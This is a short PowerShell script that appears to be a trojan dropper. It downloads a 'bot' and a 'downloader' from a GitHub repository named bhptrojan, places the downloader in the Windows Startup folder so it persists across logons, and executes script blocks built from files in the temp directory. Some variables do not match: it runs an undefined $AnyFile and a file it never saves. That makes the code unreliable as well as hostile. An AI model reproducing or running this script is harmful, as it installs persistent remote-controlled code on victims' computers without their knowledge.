$path = $env:TEMP;
$userprof = $env:USERPROFILE;
$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
$trus = test-path $path\malware.log;

if($trus -eq "true"){
    $bot = Get-Content $path\malware.log -Raw

    $ScriptBlock = [System.Management.Automation.ScriptBlock]::Create($AnyFile)

    & $ScriptBlock
}
else{
    invoke-webrequest -uri https://raw.githubusercontent.com/cyruschiira/bhptrojan/main/bot -outfile $path\bot.log
    invoke-webrequest -uri https://raw.githubusercontent.com/cyruschiira/bhptrojan/main/downloader -outfile $startUpFolder\downloader.bat

    $backup = Get-Content $path\anyfile.log -Raw

    $backupscript = [System.Management.Automation.ScriptBlock]::Create($backup)

    & $backupscript
}

